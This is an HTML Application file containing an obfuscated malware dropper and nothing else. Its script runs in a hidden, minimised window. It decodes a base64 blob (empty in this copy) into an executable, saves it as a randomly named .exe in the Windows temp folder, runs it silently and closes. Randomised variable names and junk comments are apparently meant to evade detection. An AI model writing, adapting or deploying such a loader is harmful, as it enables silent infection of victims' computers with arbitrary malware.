<html>
<head><title>.</title>
<hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
<script language="javascript">
// FxUSrNuNHwucdMFCoftisLpnoeANXhJRpgTNklVwlplOOjFWJJTac
try {
// bEJSeiAaioNLhCKAruVlbuDdYrGBasxmiMT HDUimsNnHLSFurwnqpk
var xagsj = new ActiveXObject("MSXML2.DOMDocument");
var yeypd = xagsj.createElement("tmp");
yeypd.dataType = "bin.base64";
// wYdeRwTOnluiAwXMDitjI wCBcNnrXWAJPiqeQhlnYig kMSyMcdSlm
var zovwjy = "";
yeypd.text = zovwjy;
var atstim = yeypd.nodeTypedValue;
// EtisDyDQQDztaPvBheXQSBnouVthPVzBoFRTkhV
var bfbdv = new ActiveXObject("ADODB.Stream");
bfbdv.type = 1;
bfbdv.open();
bfbdv.write(atstim);
var cjmafq = new ActiveXObject("Scripting.FileSystemObject");
var dgnlvf = cjmafq.GetSpecialFolder(2) + "\\JrWBrooj.exe";
bfbdv.saveToFile(dgnlvf, 2);
bfbdv.close();
var ewkbi = new ActiveXObject("WScript.Shell");
ewkbi.run(dgnlvf, 0, false);
} catch(e) {}
window.close();
</script>
</head>
<body></body>
</html>
